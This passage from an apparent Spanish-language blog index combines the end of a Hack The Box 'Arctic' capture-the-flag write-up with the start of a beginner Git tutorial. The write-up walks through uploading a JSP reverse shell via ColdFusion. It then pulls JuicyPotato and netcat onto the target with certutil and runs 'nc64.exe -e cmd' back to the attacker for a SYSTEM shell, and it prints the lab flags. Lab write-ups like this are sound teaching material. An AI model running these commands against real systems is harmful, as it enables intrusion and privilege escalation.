que se conecte a nuestro equipo con el archivo reverse. jsp que estaremos alojando y lo guardaremos en la ruta expuesta en la que tenemos acceso de ver los recursos C:\ColdFusion8\wwwroot\CFIDE\reverse. jsp Realizamos el submit Lo siguiente sera compartirnos el archivo reverse. jsp en nuestro equipo, lo haremos con python ❯ python3 -m http. server 80Serving HTTP on 0. 0. 0. 0 port 80 (http://0. 0. 0. 0:80/) . . . Una vez la tarea haya sido creada, para correrla debemos darle al primer boton en verde en la parte de actions y vemos que recibo la petición en mi maquina ❯ python3 -m http. server 80Serving HTTP on 0. 0. 0. 0 port 80 (http://0. 0. 0. 0:80/) . . . 10. 10. 10. 11 - - [11/Apr/2023 17:15:00]  GET /reverse. jsp HTTP/1. 1  200 -Recargamos la ruta en la que teniamos acceso a listar los recursos y genial vemos el reverse. jsp Quiere decir que si ahora pinchamos en el archivo reverse. jsp al interpretarme el servidor el archivo jsp, deberiamos ganar acceso al sistema. Le damos y con ncat nos ponemos en escucha en el puerto 443, tambien haciendo uso de rlwrap para obtener una consola mas interactiva. ❯ rlwrap ncat -nlvp 443Ncat: Version 7. 92 ( https://nmap. org/ncat )Ncat: Listening on :::443Ncat: Listening on 0. 0. 0. 0:443Esperamos unos segundos y ganamos acceso al sistema como el usuario tolis ❯ rlwrap ncat -nlvp 443Ncat: Version 7. 92 ( https://nmap. org/ncat )Ncat: Listening on :::443Ncat: Listening on 0. 0. 0. 0:443Ncat: Connection from 10. 10. 10. 11. Ncat: Connection from 10. 10. 10. 11:49672. Microsoft Windows [Version 6. 1. 7600]Copyright (c) 2009 Microsoft Corporation.  All rights reserved. whoamiwhoamiarctic\tolisSi ahora nos vamos al directorio personal del usuario tolis, podemos leer la primera flag user. txt cd C:\Users\tolis\Desktopcd C:\Users\tolis\Desktoptype user. txttype user. txtb2d38d2f34b46b4189d147c805813fa4C:\Users\tolis\Desktop&gt;Escalada de Privilegios #: Veamos que privilegios tenemos como el usuario tolis, para ello usaremos el comando whoami /priv whoami /privPRIVILEGES INFORMATION----------------------Privilege Name        Description                State  ============================= ========================================= ========SeChangeNotifyPrivilege    Bypass traverse checking         Enabled SeImpersonatePrivilege    Impersonate a client after authentication Enabled SeCreateGlobalPrivilege    Create global objects           Enabled SeIncreaseWorkingSetPrivilege Increase a process working set      DisabledTenemos habilitado el seImpersonatePrivilege, podemos explotarlo de muchas formas, pero en esta ocasión lo haremos de una comoda: Primero vamos a descargarnos el JuicyPotato del repositorio de github  https://github. com/ohpe/juicy-potatoNos vamos a los releases y concretamente nos descargamos el juicyPotato. exe Ahora nos vamos a descargar el ejecutable de ntcat para windowns del siguiente enlace, concretamente la versión 1. 12, debemos descomprimirlo y usar el nc. 64. exe  https://eternallybored. org/misc/netcat/Una vez tengamos ambos archivos, vamos a proceder a subirlos a la maquina victima ❯ ls JuicyPotato. exe  nc64. exe  reverse. jspPara subirlos nos compartiremos un servicio con python3 y en la maquina victima haremos uso de certutil. exe, para descargarnos los archivos, no debemos olvidar que debemos irnos a una ruta en la cual tengamos permisos como C:\Windows\Temp cd C:\Windows\Tempcd C:\Windows\Tempmkdir Privescmkdir Privesccd Privesccd PrivescC:\Windows\Temp\Privesc&gt;Ejecutamos certutil. exe certutil. exe -f -urlcache -split http://10. 10. 16. 8/nc64. exe nc64. execertutil. exe -f -urlcache -split http://10. 10. 16. 8/nc64. exe nc64. exe**** Online **** 0000 . . .  b0d8CertUtil: -URLCache command completed successfully. certutil. exe -f -urlcache -split http://10. 10. 16. 8/JuicyPotato. exe JuicyPotato. execertutil. exe -f -urlcache -split http://10. 10. 16. 8/JuicyPotato. exe JuicyPotato. exe**** Online **** 000000 . . .  054e00CertUtil: -URLCache command completed successfully. C:\Windows\Temp\Privesc&gt;y recibimos la petición en nuestra maquina ❯ python3 -m http. server 80Serving HTTP on 0. 0. 0. 0 port 80 (http://0. 0. 0. 0:80/) . . . 10. 10. 10. 11 - - [11/Apr/2023 17:59:47]  GET /nc64. exe HTTP/1. 1  200 -10. 10. 10. 11 - - [11/Apr/2023 17:59:50]  GET /nc64. exe HTTP/1. 1  200 -10. 10. 10. 11 - - [11/Apr/2023 18:00:02]  GET /JuicyPotato. exe HTTP/1. 1  200 -10. 10. 10. 11 - - [11/Apr/2023 18:00:04]  GET /JuicyPotato. exe HTTP/1. 1  200 -Verificamos que los archivos se subieron correctamente. dir Volume in drive C has no label. Volume Serial Number is 5C03-76A8 Directory of C:\Windows\Temp\Privesc13/04/2023 04:57   &lt;DIR&gt;     . 13/04/2023 04:57   &lt;DIR&gt;     . . 13/04/2023 04:57      347. 648 JuicyPotato. exe13/04/2023 04:57       45. 272 nc64. exe        2 File(s)    392. 920 bytes        2 Dir(s)  1. 432. 981. 504 bytes freeC:\Windows\Temp\Privesc&gt;Como ya tenemos ambos archivos, la idea es ahora que con el JuicyPotato. exe podemos inyectar comandos de manera privilegiada. . \JuicyPotato. exeJuicyPotato v0. 1 Mandatory args: -t createprocess call: &lt;t&gt; CreateProcessWithTokenW, &lt;u&gt; CreateProcessAsUser, &lt;*&gt; try both-p &lt;program&gt;: program to launch-l &lt;port&gt;: COM server listen portOptional args: -m &lt;ip&gt;: COM server listen address (default 127. 0. 0. 1)-a &lt;argument&gt;: command line argument to pass to program (default NULL)-k &lt;ip&gt;: RPC server ip address (default 127. 0. 0. 1)-n &lt;port&gt;: RPC server listen port (default 135)-c &lt;{clsid}&gt;: CLSID (default BITS:{4991d34b-80a1-4291-83b6-3328366b9097})-z only test CLSID and print token's userC:\Windows\Temp\Privesc&gt;Procedemos a ejecutarlo con los parametros necesarios:  Con -t que es para crear un proceso vamos a usar * para usar las dos opciones Con -l un puerto (puede ser el que quieras) Con -p vamos a ejecutar un programa, que en nuestro caso sera la cmd. exe para atraves de ella ejecutar un comando privilegiado Con -a le pasaremos el argumentos, donde le pasaremos la ruta donde recide el nc64. exe para enviarnos una consola interactivaNos ponemos en escucha en nuestro equipo y proseguimos a ejecutarlo, si vemos que no nos hace nada, hay que ejecutarlo varias veces. . \JuicyPotato. exe -t * -l 1337 -p C:\Windows\System32\cmd. exe -a  /c C:\Windows\Temp\Privesc\nc64. exe -e cmd 10. 10. 16. 8 443 . \JuicyPotato. exe -t * -l 1337 -p C:\Windows\System32\cmd. exe -a  /c C:\Windows\Temp\Privesc\nc64. exe -e cmd 10. 10. 16. 8 443 Testing {4991d34b-80a1-4291-83b6-3328366b9097} 1337. . . . [+] authresult 0{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM[+] CreateProcessWithTokenW OKC:\Windows\Temp\PRIVESC&gt;Y recibimos la conexión ❯ rlwrap ncat -nlvp 443Ncat: Version 7. 92 ( https://nmap. org/ncat )Ncat: Listening on :::443Ncat: Listening on 0. 0. 0. 0:443Ncat: Connection from 10. 10. 10. 11. Ncat: Connection from 10. 10. 10. 11:49816. Microsoft Windows [Version 6. 1. 7600]Copyright (c) 2009 Microsoft Corporation.  All rights reserved. whoamiwhoamint authority\systemLo unico que nos queda por hacer es dirigirnos al directorio personal del usuario administrator y visualizamos la segunda flag root. txt :) cd C:\Users\Administrator\Desktopcd C:\Users\Administrator\Desktoptype root. txttype root. txt4804d15552ecad867e5f3b60985e1d34C:\Users\Administrator\Desktop&gt;"
    }, {
    "id": 38,
    "url": "http://localhost:4000/articulos/Git",
    "title": "Aprende a usar Git gratis desde cero y vuelvete un experto",
    "body": "2023/04/10 - Hola en esta ocasión hablaremos de Git donde explicaremos paso a paso como funciona y el alcance que tiene que hace que sea necesario aprenderlo cuanto antes, asi que preparate por que debes aprender a usarlo a la de ya!. Indice y Estructura:  Que es Git? Control de Versiones Repositorio     Repositorio Local   Repositorio Remoto    Commit - Comprometer Instalación Configuración Creación del Repositorio Areas de Git     Directorio de Trabajo - Working Directory    Area de Preparación - Staging Area   Repositorio . git - Repository . git    Estados de Git     Modificada - Modified   Preparada - Staged   Confirmada - Commited    Estado del Repositorio     Renombrar archivos del Repositorio   Eliminar archivos del Repositorio   Gitignore - Ignorar archivos y directorios    Creación de un Commit     Estructura del Commit   Historial de Commits   Creación Alterna de Commits   Cambiar Descripción del Commit   Revertir Commits    Branch - Ramas     Creación de un Branch   Moverse de Branch   Cambiar Nombre al Branch   Eliminar un Branch   Crear Commits en un Branch   Historial de Commits en Branchs    Merge - Fusionar Branchs     Conflictos en Merge - Conflictos al fusionar branchs    Conexión con GithubQue es Git? #: Es un sistema de control de versiones que nos va a permitir rastrear todos lo cambios que hemos hecho en un conjunto de archivos. Control de Versiones #: Viene a ser un sistema encargado de administrar los cambios que hemos realizado en un conjunto de archivos o en programas de computadora. Repositorio #: Es un conjunto o colección de archivos de distintas versiones de un proyecto. Existen 2 tipos de de reposototios: Repositorio local #: Es local cuando esta almacenado unicamente en la pc que lo creamos donde solo nosotros tendremos acceso a el. Repositorio Remoto #: Cuando queremos dar acceso a otros desarrolladores o colaboradores a nuestro repositorio o para tener una copia segura guardada en un servidor externo, creamos servidores remotos. Ambos tipos de repositorios trabajan juntos ya que podemos crear una copia local de un repositorio remoto en nuestra pc como local y podemos enviar tambien el repositorio local que creamos a un repositorio remoto. Commit - Comprometer #: Son un registro del estado de un proyecto en un momento especifico, a lo largo de la vida del proyecto. Supongamos que creamos un archivo, editamos el archivo, creamos una carpeta y borramosel archivo: cada una de estas acciones vendria a ser un commit Instalación #: Para poder instalar Git si estamos en windows debemos ir a la pagina oficial para poder descargalo y al ejecutarlo solo debemos seguir los pasos por defecto:  https://git-scm. com/downloadsEn nuestro caso ya que trabajaremos en linux por ser mas comodo unicamente neceistamos ejecutar el comando apt install git y ya lo tendriamos instalado En cuanto a lo demas todo es exactamente igual para cualquier sistema operativo en cuanto al desarrollo del curso despues de la instalación Configuración #: Una vez tengamos ya instalado Git en nuestro sistema para comenzar a trabajar vamos a crear un directorio en un ruta de nuestro sistema. En este caso creare el directorio miGit usando el comando mkdir y con cd ingresare al directorio ❯ mkdir miGit❯ cd miGitAhora procederemos a configurar algo muy importante en Git que seria nuestro usuario y correo, ya que cada vez que creeemos un commit se registrara la información de quien realizo el cambio. Esto es util ya que si estamos trabajando en un proyecto colaborativo, cada uno de los desarrolladores del proyecto podran saber quien realizo ese cambio y cual es su correo asociado; de igual manera si solo nosotros estamos trabajando en el proyecto podemos saber en un futuro que cambio realizamos. Para poder realizar la configuración del nombre de usuario solo debemos ejecutar el siguiente comando. ❯ git config --global user. name  Firtsmiracle cabe mencionar que si unicamente deseamos esta configuración para un unico proyecto debemos omitir el uso de la bandera --global, pero al ser nosotros dueños del repositorio es recomendable hacerlo globalmente. Si queremos ver que los cambios se realizaron correctamente usamos: ❯ git config user. nameFirtsmiracleDe la misma manera si queremos configurar la información del correo, usamos el comando: ❯ git config --global user. email  firtsmiracle@hotmail. com volvemos a revisar si los cambios se guardaron exitosamente con el comando: ❯ git config user. emailfirtsmiracle@hotmail. comCreación de Repositorio #: Una vez tengamos configurado nuestro nombre de usuario y el correo, finalmente podemos continuar con lo mas fundamental de Git, que es la creación de un repositorio. Primeramente debemos estar dentro de nuestra carpeta o directorio de trabajo en nuestro caso en la carpeta miGit con pwd verificamos que estemos en la ruta ❯ pwd/home/fmiracle/Desktop/Prueba/Git/miGitPara poder crear el repositorio dentro de esa carpeta debemos ejecutar el siguente comando git init ❯ git initInicializado repositorio Git vacío en /home/fmiracle/Desktop/Prueba/Git/miGit/. git/Este comando nos inicializara un repositorio de Git dentro de esta carpeta y con ello vamos a poder rastrear las versiones de todos los archivos que esten dentro de esta carpeta. Esto nos crea una carpeta de nombre . git que se encuentra oculta como medida de seguridad, si deseamos verla podemos usar el comando ls -la ❯ ls -ladrwxr-xr-x root root 8 B Mon Apr 10 17:38:01 2023  . drwxr-xr-x root root 10 B Mon Apr 10 17:37:56 2023  . . drwxr-xr-x root root 98 B Mon Apr 10 17:38:01 2023  . gitAreas de Git #: Existen tres areas en las cuales puede estar un archivo Git, donde cada una de ellas representara un estado distinto de un archivo.  Directorio de Trabajo - Working Directory #: Es la carpeta del proyecto que justamente va a contener los archivos y el directorio oculto . git Area de Preparación - Staging Area #: Viene a ser una area intermedia entre el directorio del trabajo y el Repositorio, aqui se encuentran los archivos y cambios que seran incluidos en el proximo commit Cabe mencionar que esta area no es definitiva para agregarla al repositorio, ya que podemos evaluar y retractar los cambios que realizamos para que no se incluyan en el proximo commit Cuando ya tenemos todos los cambios listo en el area de preparación, ahora si podemos crear un commit que sera el definitivo donde se encontraran los cambios que se agregaran al repositorio Repositorio . git #: Aqui se contienen todos los metadatos y versiones de todo nuestro proyecto, es la parte del repositorio que se copia al clonar un repositorio externo en nuestra pc, concretamente cuando hacemos git clone https://github. com/nombre_repo Es la parte mas importante de Git Estados de Git #: Los archivos al estar en cada una de las areas mencionadas, repre/senta un estado distinto que podemos ver a continuación: Modificada - Modified #: La versión del archivo esta modificada, si la versión contiene cambios que no son parte del repositorio y no se han añadido al area de preparación Preparada - Staged #: La versión es preparada, cuando contiene cambios que no son parte del repositorio, pero si fue añadida al area de preparación Confirmada - Commited #: La versión es confirmada, si ya se encuentra en el directorio . git Estado del Repositorio #: Para poder verificar el estado de nuestro repositorio podemos hacer uso del comando git status ❯ git statusEn la rama mainNo hay commits todavíano hay nada para confirmar (crea/copia archivos y usa  git add  para hacerles seguimiento)Despues de ejecutar el comando nos muestra que estamos en la rama main, que aun no hemos realizado un commit y ademas vemos que tampoco hay nada pendiente para realizar un commit  Cabe mencionar que segun la instalación nuestra rama principal puede ser main o master y si deseamos cambiarla debemos ejecutar el comando git config --global init. defaultBranch main para establecer main como la rama principal por defecton, aunque de seguir con la que tenemos por defecto podemos trabajar sin problemas igualmente, pero hay que tenerlo en cuenta Ahora que ocurre si yo creo un archivo lo llamaremos archivo_git. txt y le introduciremos un contenido. ❯ /bin/cat archivo_git. txtEste es mi primer repositorioSi volvemos a ejecutar el comando git status, esta vez nos dice que tenemos archivos que no estamos haciendo seguimiento, concretamente el archivo que creamos archivo_git. txt ❯ git statusEn la rama mainNo hay commits todavíaArchivos sin seguimiento: (usa  git add &lt;archivo&gt;. . .   para incluirlo a lo que se será confirmado)	archivo_git. txtno hay nada agregado al commit pero hay archivos sin seguimiento presentes (usa  git add  para hacerles seguimiento)Si queremos comenzar a hacer seguimiento del arhivo, debemos ejecutar el comando git add y seguido el nombre del archivo ❯ git add archivo_git. txtA simple vista parece no haberse ejecutado ningun cambio pero si volvemos a verificar el estado con git status, ahora si tenemos cambios que van a ser agregados al proximo commit ❯ git statusEn la rama mainNo hay commits todavíaCambios a ser confirmados: (usa  git rm --cached &lt;archivo&gt;. . .   para sacar del área de stage)	nuevos archivos: archivo_git. txtCuando vemos que el archivo ya es parte de los cambios que se agregaran a el proximo commit, quiere decir que ya es parte del area de preparación, pero recordemos que en esta area aun podemos retractarnos y decir a Git que no queremos agregarlos al proximo commit, y esto lo hacemos como nos indica Git con el comando git rm --cached y seguidamente el nombre del archivo. ❯ git rm --cached archivo_git. txtrm 'archivo_git. txt'Volvemos a verificar el estado y vemos que el archivo nuevamente no esta en seguimiento. ❯ git statusEn la rama mainNo hay commits todavíaArchivos sin seguimiento: (usa  git add &lt;archivo&gt;. . .   para incluirlo a lo que se será confirmado)	archivo_git. txtno hay nada agregado al commit pero hay archivos sin seguimiento presentes (usa  git add  para hacerles seguimiento)Saber esto es importante ya que en el area de preparación los cambios no son definitivos, ya que podemos equivocarnos y por error incluir un archivo al area de preparaciónpodemos verificar que cambios seran agregados y si queremos removerlos del area de preparación Ahora si queremos volver a colocar el archivo en el area de preparación, usamos nuevamente el comando git add y nuevamente vemos que hay cambios que seran agregados al proximo commit ❯ git add archivo_git. txt❯ git statusEn la rama mainNo hay commits todavíaCambios a ser confirmados: (usa  git rm --cached &lt;archivo&gt;. . .   para sacar del área de stage)	nuevos archivos: archivo_git. txtLo que faltaria ahora sera pasar el archivo del area de preparación al repositorio como tal . git para ello veamos a continuaciòn como creamos un commit Renombrar Archivos del Repositorio #: Como vimos por cada acción que hagamos al archivo, al usar git status nos saldra el mensaje de que hay archivos sin seguimiento y demos usar git add para agregarlos. Concretamente en este caso si queremos renombar un archivo usamos el comando mv. Renombraremos el archivo que creamos archivo. txt. ❯ ls archivo. txt  archivo_git. txt❯ mv archivo. txt archivo_renombrado. txtSeguidamente debemos agregar el archivo con git add a el area de preperación, despues de ejecutar git status ❯ git statusEn la rama mainArchivos sin seguimiento: (usa  git add &lt;archivo&gt;. . .   para incluirlo a lo que se será confirmado)	archivo_renombrado. txtno hay nada agregado al commit pero hay archivos sin seguimiento presentes (usa  git add  para hacerles seguimiento)❯ git add archivo_renombrado. txtEl problema es que es mas tedioso y repetitivo estar ejecutando cada comando, por ello Git nos da la opción de acortar todos estos pasos realizados solo usando un comando git mv y seguido renombrar el archivo, practicamente lo mismo que ejecutamos al renombrarlo con mv solo que ahora debemos anteponer la palabra git En este caso renombraremos el archivo archivo_renombrado. txt ❯ git mv archivo_renombrado. txt archivo_modificado. txt❯ git statusEn la rama mainCambios a ser confirmados: (usa  git restore --staged &lt;archivo&gt;. . .   para sacar del área de stage)	nuevos archivos: archivo_modificado. txtVemos que usando el comando git mv ya nos es necesario usar git add ya que el archivo se agrega automaticamente al area de preparación, lo que nos optimiza el proceso. Eliminar archivos del Repositorio #: De la misma forma que renombramos el archivo, podemos hacer lo mismo para eliminarlo. anteponiendo la palabra git y seguido el comando rm. Para este caso vamos a eliminar el archivo que renombramos antes archivo_modificado. txt, para ello como ya se encontraba en el area de preparación debemos retirarla haciendo uso de los comandos: ❯ git restore --staged archivo_modificado. txtgit restore archivo_modificado. txtUna vez el arbol de trabajo este limpio, ejecutamos el comando git rm y seguido el archivo que queremos eliminar. Visualizamos los cambios y vemos que nos agilizo el proceso ya que el archivo se encuentra en el area de preparación y no fue necesario agregarlo ejecutando el git add ❯ git rm archivo_modificado. txtrm 'archivo_modificado. txt'❯ git statusEn la rama mainCambios a ser confirmados: (usa  git restore --staged &lt;archivo&gt;. . .   para sacar del área de stage)	borrados:    archivo_modificado. txtGitignore - Ignorar archivos y directorios #: Si queremos ignorar archivos, que nunca se incluyan en nuestro repositorio y que solo sean especificos para nuestra máquina como son las variables de entorno. Supongamos que estamos trabajando con una base de datos que tenemos instalada localmente, en este caso queremos que este archivo no se suba al repositorio, ya que no queremos que otras personas conozcan estos datos. Para ello vamos a crearnos un archivo al que llamaremos . env que tendra de contenido unas supuestas credenciales. ❯ /bin/cat . envuser=firtsmiraclepassword=12345Ahora ejecuto git status y nos aparece este archivo . env ❯ git statusEn la rama mainArchivos sin seguimiento: (usa  git add &lt;archivo&gt;. . .   para incluirlo a lo que se será confirmado)	. envno hay nada agregado al commit pero hay archivos sin seguimiento presentes (usa  git add  para hacerles seguimiento)Pero yo no quiero que por error este archivo se agregue a incluir en un commit, para ello debemos crear un archivo de nombre . gitignore y en este archivo especificare cuales son los archivos o rutas de carpetas que quiero ignorar para que no vallan a nuestro repositorio. En este caso agregare dentro del archivo . gitignore a nuestro archivo que contenia las credenciales . env ❯ /bin/cat . gitignore. envY si ahora vuelvo a ejecutar el comando git status el archivo . env ya no aparece, solo aparece el archivo . gitignore ❯ git statusEn la rama mainArchivos sin seguimiento: (usa  git add &lt;archivo&gt;. . .   para incluirlo a lo que se será confirmado)	. gitignoreno hay nada agregado al commit pero hay archivos sin seguimiento presentes (usa  git add  para hacerles seguimiento)Entonces agregamos nuestro archivo . gitignore con git add y verificamos ❯ git add . gitignore❯ git statusEn la rama mainCambios a ser confirmados: (usa  git restore --staged &lt;archivo&gt;. . .   para sacar del área de stage)	nuevos archivos: . gitignoreDe esta manera todo lo que incluyamos dentro del archivo . gitignore no sera agregado por ningun motivo al repositorio.  Un pequeño tip final es que con el comando git status -s, podemos ver el estado en el que se encuentra cada archivo de manera simplificada. ❯ git status -sA . gitignoreD archivo_modificado. txt?? archivo_cambiado. txtDonde A seria agregado, D borrado y cuando vemos ?? quiere decir que el archivo aun no tiene un seguimiento. Creación de un Commit #: Antes de crear nuestro primer commit, debemos recordar que un commit viene a ser un registro o foto del estado de nuestro proyecto en un momento especifico. Registra los cambios realizados en los archivos en comparación con la versión anterior.  Cada vez que creeemos un commit debemos agregarle una descripción segun la acción o los cambios que hayamos realizado esto es muy importante para saber con detalle a traves del tiempo las modificaciones que se realizaron en el proyecto. Ahora comenzemos a crear nuestro commit Anteriormente cuando ejecutamos git status, veiamos que habian cambios que estan listos para ser agregados del area de preparación a al repositorio . git. ❯ git statusEn la rama mainNo hay commits todavíaCambios a ser confirmados: (usa  git rm --cached &lt;archivo&gt;. . .   para sacar del área de stage)	nuevos archivos: archivo_git. txtLo siguiente seria agregar un commit, esto lo hacemos con el comando git commit y seguidamente con -m agregamos una descripción. ❯ git commit -m  agregar mi archivo de texto [main (commit-raíz) 0143452] agregar mi archivo de texto 1 file changed, 1 insertion(+) create mode 100644 archivo_git. txtSe nos muestra información del commit, como su identificador 0143452, la descripción y hubo una modificación en conjunto con una inserción que significa que se agrego una linea al archivo. Estructura del Commit #: La estructura de uncommit se compone de varias partes, esto lo observamos al ejecutar el comando git log. ❯ git logcommit 0143452c010ede2332f5c1b8bad7815743770a2a (HEAD -&gt; main)Author: Firtsmiracle &lt;firtsmiracle@hotmail. com&gt;Date:  Mon Apr 10 18:43:50 2023 +0000  agregar mi archivo de textoPodemos observar inicialmente una serie de numeros alfanumericos que corresponde a un identificador unico llamado SHA.  SHA: Scure Hash Algorith o Algoritmo de hash seguro este SHA identifica:  Los cambios realizados Dónde se realizaron los cambios Quién realizo los cambiosSeguidamente el commit contiene el nombre del usuario en conjunto con el correo asignado Author: Firtsmiracle &lt;firtsmiracle@hotmail. com&gt;; tambien podemos observar la fecha de creación del commit que corresponde a Date:  Mon Apr 10 18:43:50 2023 +0000 Finalmente en la ultima parte podemos ver la descripción que agregamos al crear nuestro commit -&gt; agregar mi archivo de texto Historial de Commits #: Si queremos ver el registro de nuestros commits, podemos usar el comando git log el cual nos mostrara el historial de todos los commits que hayamos creado. ❯ git logcommit 0143452c010ede2332f5c1b8bad7815743770a2a (HEAD -&gt; main)Author: Firtsmiracle &lt;firtsmiracle@hotmail. com&gt;Date:  Mon Apr 10 18:43:50 2023 +0000  agregar mi archivo de textoComo vimos anteriormente vemos el commit con su estructura; cabe resaltar que si creamos mas commits con este comandos los veremos todos. Creación Alterna de Commits #: Supongamos que editamos el archivo que tenemos archivo_git. txt y le cambiamos el contenido El cual cambiaremos de este contenido: ❯ /bin/cat archivo_git. txtEste es mi primer repositorioa este nuevo ❯ /bin/cat archivo_git. txtEste es mi segundo commitSi ejecutamos git status vemos que tenemos un archivo en estado modificado y que hay cambios no rastreados para el proximo commit ❯ git statusEn la rama mainCambios no rastreados para el commit: (usa  git add &lt;archivo&gt;. . .   para actualizar lo que será confirmado) (usa  git restore &lt;archivo&gt;. . .   para descartar los cambios en el directorio de trabajo)	modificados:   archivo_git. txtsin cambios agregados al commit (usa  git add  y/o  git commit -a )Para agregar los cambios entonces debemos ejecutar git add ❯ git add archivo_git. txt❯ git statusEn la rama mainCambios a ser confirmados: (usa  git restore --staged &lt;archivo&gt;. . .   para sacar del área de stage)	modificados:   archivo_git. txtAhora que el archivo esta lista para agregarse al commit, procerederemos a crearlo Esta vez ejecutaremos unicamente el comando git commit sin ningun parametro adiocional, lo que hara que se nos abra el editor de texto donde podremos insertar la descripción ddel commit Generalmente se nos abrira el editor por defecto en nuestro sistema en nuestro caso por defecto se abrira en vim o nano, pero si deseamos podemos configurar el editor apra que inicie con otro con el que trabajemos mas comodo. Para ello hay varias opciones independientemente si nos encontramos en Linux o en Windows Para Linux: Si queremos usar Visual Studio Code ejecutar: $ git config --global core. editor  code --wait Si queremos usar Sublime Text ejecutar: $ git config --global core. editor  subl -n -w Si queremos usar emacs ejecutar: git config --global core. editor emacsPara Windows: Si queremos usar Visual Studio Code ejecutar: $ git config --global core. editor  code --wait Si queremos usar Sublime Text ejecutar: $ git config --global core. editor  'C:/Program Files (x86)/sublime text 3/subl. exe' -w Si queremos usar Notepad++ ejecutar: $ git config --global core. editor  'C:/Program Files (x86)/Notepad++/notepad++. exe' -multiInst -notabbar -nosession -noPlugin Entonces una vez tengamos configurado nuestro editor procedemos a ejecutar git commit y se procedera a abrirnos nuestro editor de texto. Tal y como nos indicar podemos agregar un mensaje del commit en una linea sin comentar y guardamos los cambios, pero si deseamos cancelar la operación simplemente el mensaje tiene que estar vacio. # Por favor ingresa el mensaje del commit para tus cambios. Las# líneas que comiencen con '#' serán ignoradas, y un mensaje# vacío aborta el commit. ## En la rama main# Cambios a ser confirmados:#	modificados:   archivo_git. txt#Entonces vamos a agregar un mensaje para el commit Cambiar texto a segundo commit# Por favor ingresa el mensaje del commit para tus cambios. Las# líneas que comiencen con '#' serán ignoradas, y un mensaje# vacío aborta el commit. ## En la rama main# Cambios a ser confirmados:#	modificados:   archivo_git. txt#y automaticamente al guardar y cerrar el archivo, procede a crearse el commit ❯ git commit[main bb00766] Cambiar texto a segundo commit 1 file changed, 1 insertion(+), 1 deletion(-)Ahora podemos volver a ver el historial de commits usando git log y esta vez vemos los dos commits ❯ git logcommit bb007665d2356b9531ce10be913fd26a27e757da (HEAD -&gt; main)Author: Firtsmiracle &lt;firtsmiracle@hotmail. com&gt;Date:  Mon Apr 10 20:13:55 2023 +0000  Cambiar texto a segundo commitcommit 0143452c010ede2332f5c1b8bad7815743770a2aAuthor: Firtsmiracle &lt;firtsmiracle@hotmail. com&gt;Date:  Mon Apr 10 18:43:50 2023 +0000  agregar mi archivo de textoCambiar Descripción del Commit #: Supongamos que creamos un commit, pero vimos que pudimos tener un error de tipeo o el mensaje no es muy descriptivo. Pues podemos modificar el ultimo commit usando el comando git commit --amend ❯ git commit --amendAl ejecutar se nos vuelve a abrir el editor de texto con la descripción que habiamos ingresado Cambiar texto a segundo commit# Por favor ingresa el mensaje del commit para tus cambios. Las# líneas que comiencen con '#' serán ignoradas, y un mensaje# vacío aborta el commit. ## Fecha:   Mon Apr 10 20:13:55 2023 +0000## En la rama main# Cambios a ser confirmados:#	modificados:   archivo_git. txt#Para modificarlo solo debemos modificar el mensaje, guardar y cerrar el archivo. Cambiar el contenido de mi commit# Por favor ingresa el mensaje del commit para tus cambios. Las# líneas que comiencen con '#' serán ignoradas, y un mensaje# vacío aborta el commit. ## Fecha:   Mon Apr 10 20:13:55 2023 +0000## En la rama main# Cambios a ser confirmados:#	modificados:   archivo_git. txt#Regresamos a donde ejecutamos el comando y vemos que se actualizo correctamente. ❯ git commit --amend[main 222c488] Cambiar el contenido de mi commit Date: Mon Apr 10 20:13:55 2023 +0000 1 file changed, 1 insertion(+), 1 deletion(-)Para verificar que se actualizo el commit en el historial usamos git log, pero esta vez agregaremos el parametro --oneline para acortar la información mostrada. ❯ git log --oneline222c488 (HEAD -&gt; main) Cambiar el contenido de mi commit0143452 agregar mi archivo de textoY vemos que fue modificado con exito.  Es importante saber que si vamos a ejecutar el comando git commit --amend lo hagamos en nuestro repositorio local no en uno remoto ya que puede ser riesgoso si lo hacemos en proyectos que ya estan siendo usados por otros desarrolladores. Como consejo hay que tratar siempre de ingresar la descripción o mensaje correcto al commit para evitar realizar este proceso Revertir Commits #: Suele pasar en ocasiones cuando estamos trabajando en algun proyecto y al crear un commit nos damos cuenta de que nos faltaba agregar algo. Si queremos revertir los cambios hechos por un commit, podemos hacerlo de forma tal que no se afecten los archivos. Para realizar esto el comando que debemos ejecutar es git reset --soft HEAD~1, donde con el parametro soft podemos reiniciarlo de modo que los archivos no se modifiquen en el directorio de trabajo. Solo se va a deshacer el registro del commit, en este caso con HEAD~1 indicaremos al ultimo commit que se realizo. ❯ git reset --soft HEAD~1Una vez ejecutamos el comando, visiblemente no vemos ningun cambio, pero si volvemos a ver el historial de commits, solo vemos el primer commit ❯ git logcommit 0143452c010ede2332f5c1b8bad7815743770a2a (HEAD -&gt; main)Author: Firtsmiracle &lt;firtsmiracle@hotmail. com&gt;Date:  Mon Apr 10 18:43:50 2023 +0000  agregar mi archivo de textoY si volvemos a leer el archivo, aún mantiene el contenido con los cambios que habiamos realizado ❯ /bin/cat archivo_git. txtEste es mi segundo commitPero que pasa si volvemos a modificar el archivo ❯ /bin/cat archivo_git. txtEste es mi segundo commit pero modificadoºy volvemos a ejecutar git status, vemos cambios listos para ser agregados y otros que aun no estan listos. ❯ git statusEn la rama mainCambios a ser confirmados: (usa  git restore --staged &lt;archivo&gt;. . .   para sacar del área de stage)	modificados:   archivo_git. txtCambios no rastreados para el commit: (usa  git add &lt;archivo&gt;. . .   para actualizar lo que será confirmado) (usa  git restore &lt;archivo&gt;. . .   para descartar los cambios en el directorio de trabajo)	modificados:   archivo_git. txtComo deshicimos el ultimo commit lo que quiere decir que el cambio a de ese ultimo commit que borramos, aún no es parte del repositorio. Para agregar todos esos cambios lo que podemos hacer es ejecutar el comando git add .  Con git add . podemos agregar todos los cambios al area de preparación, sin necesidad de ejecutar cada archivo. ❯ git add . ❯ git statusEn la rama mainCambios a ser confirmados: (usa  git restore --staged &lt;archivo&gt;. . .   para sacar del área de stage)	modificados:   archivo_git. txtAhora si queremos crear este commit, volvemos a ejecutar git commit y asignamos un mensaje mas especifico Actualizar teto del segundo commit modificado# Por favor ingresa el mensaje del commit para tus cambios. Las# líneas que comiencen con '#' serán ignoradas, y un mensaje# vacío aborta el commit. ## En la rama main# Cambios a ser confirmados:#	modificados:   archivo_git. txt#Guardamos y cerramos y ya tendriamos creado este nuevo commit ❯ git commit[main 415796f] Actualizar teto del segundo commit modificado 1 file changed, 1 insertion(+), 1 deletion(-)Branch - Ramas #: Un branch es una linea independiente de desarrollo en el repositorio, gracias a estas podemos tener copias del branch principal y que estas vallan evolucionando o cambiando independientemente sin afectar 